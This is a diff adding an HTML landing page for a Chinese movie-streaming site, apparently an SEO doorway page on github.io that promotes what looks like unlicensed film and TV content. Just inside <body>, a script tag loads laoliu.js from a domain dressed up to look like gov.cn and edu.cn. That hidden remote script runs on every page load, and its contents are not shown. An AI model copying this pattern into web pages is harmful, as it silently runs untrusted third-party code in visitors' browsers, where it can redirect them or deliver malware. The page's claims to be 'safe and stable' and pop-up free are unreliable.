@@ -1,0 +1,400 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>秋霞电影网影音先锋 - 高清影视在线观看</title>
+<meta name="description" content="秋霞电影网影音先锋（qiuxiadianyingwangyingyinxianfeng-h5）提供最新电影、电视剧、综艺高清在线播放，影音先锋极速体验，官方网址：https://qiuxiadianyingwangyingyinxianfeng-h5.github.io">
+<meta name="keywords" content="秋霞电影网影音先锋, qiuxiadianyingwangyingyinxianfeng-h5, 影音先锋, 在线电影, 高清影视">
+<meta name="robots" content="index,follow">
+<style>
+/* ===== Reset & 基础 ===== */
+*,*::before,*::after { margin:0; padding:0; box-sizing:border-box; }
+html { scroll-behavior:smooth; }
+body {
+  font-family:"Segoe UI", "PingFang SC", sans-serif;
+  background:#0f0f1a;
+  color:#e0e0e0;
+  overflow-x:hidden;
+}
+
+/* ===== 顶部 Header ===== */
+.site-header {
+  background:rgba(15,15,26,.95);
+  backdrop-filter:blur(10px);
+  position:sticky;
+  top:0;
+  z-index:1000;
+  padding:14px 20px;
+  display:flex;
+  align-items:center;
+  justify-content:space-between;
+  border-bottom:1px solid #2a2a4a;
+}
+.logo {
+  font-size:20px;
+  font-weight:700;
+  color:#ff4757;
+  letter-spacing:1px;
+}
+.logo span { color:#fff; }
+.menu-btn {
+  display:none;
+  background:none;
+  border:none;
+  color:#fff;
+  font-size:26px;
+  cursor:pointer;
+}
+.nav-links {
+  display:flex;
+  gap:24px;
+  list-style:none;
+}
+.nav-links a {
+  color:#ccc;
+  font-size:15px;
+  transition:.3s;
+  position:relative;
+}
+.nav-links a:hover { color:#ff4757; }
+
+/* ===== Hero 首屏 ===== */
+.hero {
+  min-height:90vh;
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  justify-content:center;
+  text-align:center;
+  padding:40px 20px;
+  background:
+    radial-gradient(ellipse at 30% 20%, rgba(255,71,87,.25), transparent 50%),
+    radial-gradient(ellipse at 70% 80%, rgba(70,100,255,.2), transparent 50%),
+    #0f0f1a;
+}
+.hero h1 {
+  font-size:42px;
+  color:#fff;
+  margin-bottom:16px;
+  text-shadow:0 0 20px rgba(255,71,87,.5);
+}
+.hero .subtitle {
+  font-size:18px;
+  color:#aaa;
+  margin-bottom:30px;
+}
+.hero .url-badge {
+  display:inline-block;
+  background:rgba(255,255,255,.08);
+  border:1px solid #ff4757;
+  border-radius:30px;
+  padding:10px 24px;
+  color:#ff6b81;
+  font-size:14px;
+  letter-spacing:1px;
+}
+
+/* ===== 通用 Section ===== */
+.section {
+  padding:70px 20px;
+  max-width:1100px;
+  margin:0 auto;
+}
+.section-title {
+  font-size:28px;
+  color:#fff;
+  margin-bottom:36px;
+  text-align:center;
+  position:relative;
+}
+.section-title::after {
+  content:"";
+  width:60px; height:3px;
+  background:#ff4757;
+  display:block;
+  margin:12px auto 0;
+  border-radius:2px;
+}
+
+/* ===== 栏目一：影视分类（横向滚动条） ===== */
+.cat-scroll {
+  display:flex;
+  gap:16px;
+  overflow-x:auto;
+  padding-bottom:12px;
+  scrollbar-width:thin;
+}
+.cat-scroll::-webkit-scrollbar { height:6px; }
+.cat-scroll::-webkit-scrollbar-thumb { background:#ff4757; border-radius:3px; }
+.cat-chip {
+  flex:0 0 auto;
+  background:linear-gradient(145deg,#1a1a2e,#16213e);
+  border:1px solid #2a2a4a;
+  border-radius:12px;
+  padding:22px 30px;
+  min-width:140px;
+  text-align:center;
+  color:#ddd;
+  font-size:16px;
+  transition:.3s;
+}
+.cat-chip:hover {
+  transform:translateY(-4px);
+  border-color:#ff4757;
+  color:#ff4757;
+}
+
+/* ===== 栏目二：精选推荐（左右交错布局） ===== */
+.feature-list {
+  display:flex;
+  flex-direction:column;
+  gap:24px;
+}
+.feature-row {
+  display:flex;
+  gap:20px;
+  align-items:center;
+  background:linear-gradient(90deg, #1a1a2e, #16213e);
+  border-radius:14px;
+  padding:20px;
+}
+.feature-row:nth-child(even) {
+  flex-direction:row-reverse;
+  background:linear-gradient(90deg, #16213e, #1a1a2e);
+}
+.feature-num {
+  font-size:40px;
+  font-weight:800;
+  color:rgba(255,71,87,.3);
+  flex:0 0 60px;
+}
+.feature-info h3 { color:#fff; margin-bottom:6px; }
+.feature-info p { color:#999; font-size:14px; }
+
+/* ===== 栏目三：站点优势（九宫格 icon 卡片） ===== */
+.advantage-grid {
+  display:grid;
+  grid-template-columns:repeat(auto-fit,minmax(200px,1fr));
+  gap:18px;
+}
+.adv-card {
+  background:#1a1a2e;
+  border-radius:12px;
+  padding:28px 20px;
+  text-align:center;
+  border-bottom:3px solid transparent;
+  transition:.3s;
+}
+.adv-card:hover {
+  border-bottom-color:#ff4757;
+  transform:scale(1.03);
+}
+.adv-icon {
+  font-size:38px;
+  margin-bottom:12px;
+}
+.adv-card h4 { color:#fff; margin-bottom:8px; }
+.adv-card p { color:#888; font-size:13px; }
+
+/* ===== 栏目四：影音先锋（时间轴结构） ===== */
+.timeline {
+  position:relative;
+  padding-left:30px;
+}
+.timeline::before {
+  content:"";
+  position:absolute;
+  left:8px; top:0; bottom:0;
+  width:2px;
+  background:linear-gradient(#ff4757,#2a2a4a);
+}
+.timeline-item {
+  position:relative;
+  margin-bottom:28px;
+  background:#1a1a2e;
+  border-radius:10px;
+  padding:18px 22px;
+}
+.timeline-item::before {
+  content:"";
+  position:absolute;
+  left:-28px; top:20px;
+  width:12px; height:12px;
+  border-radius:50%;
+  background:#ff4757;
+  box-shadow:0 0 0 4px rgba(255,71,87,.2);
+}
+.timeline-item h4 { color:#ff6b81; margin-bottom:6px; }
+.timeline-item p { color:#999; font-size:14px; }
+
+/* ===== 底部 ===== */
+.site-footer {
+  background:#0a0a14;
+  padding:40px 20px 24px;
+  text-align:center;
+  border-top:1px solid #2a2a4a;
+}
+.site-footer p { color:#666; font-size:13px; margin:4px 0; }
+.site-footer .site-link { color:#ff4757; }
+
+/* ===== 响应式 ===== */
+@media (max-width:768px) {
+  .menu-btn { display:block; }
+  .nav-links {
+    display:none;
+    position:absolute;
+    top:100%; left:0; right:0;
+    flex-direction:column;
+    background:#0f0f1a;
+    padding:20px;
+    gap:16px;
+    border-bottom:1px solid #2a2a4a;
+  }
+  .nav-links.active { display:flex; }
+  .hero h1 { font-size:30px; }
+  .hero .subtitle { font-size:15px; }
+  .feature-row,
+  .feature-row:nth-child(even) {
+    flex-direction:column;
+    text-align:center;
+  }
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<!-- 顶部导航 -->
+<header class="site-header">
+  <div class="logo">秋霞<span>电影网</span></div>
+  <button class="menu-btn" onclick="document.getElementById('navMenu').classList.toggle('active')">☰</button>
+  <ul class="nav-links" id="navMenu">
+    <li><a href="#home">首页</a></li>
+    <li><a href="#category">影视分类</a></li>
+    <li><a href="#feature">精选推荐</a></li>
+    <li><a href="#advantage">站点优势</a></li>
+    <li><a href="#player">影音先锋</a></li>
+  </ul>
+</header>
+
+<!-- 首屏 Hero -->
+<section id="home" class="hero">
+  <h1>秋霞电影网 · 影音先锋</h1>
+  <p class="subtitle">高清影视在线播放，影音先锋极速体验</p>
+  <span class="url-badge">🌐 https://qiuxiadianyingwangyingyinxianfeng-h5.github.io</span>
+</section>
+
+<!-- 栏目一：影视分类（横向滚动） -->
+<section id="category" class="section">
+  <h2 class="section-title">影视分类</h2>
+  <div class="cat-scroll">
+    <div class="cat-chip">🎬 动作片</div>
+    <div class="cat-chip">😂 喜剧片</div>
+    <div class="cat-chip">💕 爱情片</div>
+    <div class="cat-chip">🔮 科幻片</div>
+    <div class="cat-chip">😱 恐怖片</div>
+    <div class="cat-chip">📽️ 纪录片</div>
+    <div class="cat-chip">📺 电视剧</div>
+    <div class="cat-chip">🎤 综艺</div>
+  </div>
+</section>
+
+<!-- 栏目二：精选推荐（左右交错） -->
+<section id="feature" class="section">
+  <h2 class="section-title">精选推荐</h2>
+  <div class="feature-list">
+    <div class="feature-row">
+      <div class="feature-num">01</div>
+      <div class="feature-info">
+        <h3>最新院线大片</h3>
+        <p>同步院线热门影片，高清流畅播放</p>
+      </div>
+    </div>
+    <div class="feature-row">
+      <div class="feature-num">02</div>
+      <div class="feature-info">
+        <h3>经典高分合集</h3>
+        <p>豆瓣高分影视作品一网打尽</p>
+      </div>
+    </div>
+    <div class="feature-row">
+      <div class="feature-num">03</div>
+      <div class="feature-info">
+        <h3>独家综艺节目</h3>
+        <p>热门综艺实时更新，精彩不间断</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目三：站点优势（九宫格） -->
+<section id="advantage" class="section">
+  <h2 class="section-title">站点优势</h2>
+  <div class="advantage-grid">
+    <div class="adv-card">
+      <div class="adv-icon">⚡</div>
+      <h4>极速加载</h4>
+      <p>影音先锋引擎加速，秒开不等待</p>
+    </div>
+    <div class="adv-card">
+      <div class="adv-icon">📱</div>
+      <h4>多端适配</h4>
+      <p>手机、平板、电脑全平台自适应</p>
+    </div>
+    <div class="adv-card">
+      <div class="adv-icon">🎯</div>
+      <h4>高清画质</h4>
+      <p>1080P / 4K 极致视觉享受</p>
+    </div>
+    <div class="adv-card">
+      <div class="adv-icon">🔒</div>
+      <h4>安全稳定</h4>
+      <p>无弹窗广告，纯净观影环境</p>
+    </div>
+    <div class="adv-card">
+      <div class="adv-icon">🔄</div>
+      <h4>实时更新</h4>
+      <p>每日上新，热剧抢先看</p>
+    </div>
+    <div class="adv-card">
+      <div class="adv-icon">💬</div>
+      <h4>弹幕互动</h4>
+      <p>边看边聊，精彩不孤单</p>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目四：影音先锋（时间轴） -->
+<section id="player" class="section">
+  <h2 class="section-title">影音先锋</h2>
+  <div class="timeline">
+    <div class="timeline-item">
+      <h4>先锋解码技术</h4>
+      <p>采用影音先锋自研解码引擎，支持多种高清格式流畅播放</p>
+    </div>
+    <div class="timeline-item">
+      <h4>P2P 加速传输</h4>
+      <p>智能节点分发，多人观看依然流畅不卡顿</p>
+    </div>
+    <div class="timeline-item">
+      <h4>边下边播</h4>
+      <p>无需等待完整下载，点击即播，节省时间与流量</p>
+    </div>
+    <div class="timeline-item">
+      <h4>海量资源库</h4>
+      <p>整合全网优质影视资源，持续扩充片库</p>
+    </div>
+  </div>
+</section>
+
+<!-- 底部 -->
+<footer class="site-footer">
+  <p>© 2026 秋霞电影网影音先锋</p>
+  <p>官方网址：<span class="site-link">https://qiuxiadianyingwangyingyinxianfeng-h5.github.io</span></p>
+  <p>本网站仅供影视信息展示与交流</p>
+</footer>
+
+</body>
+</html>
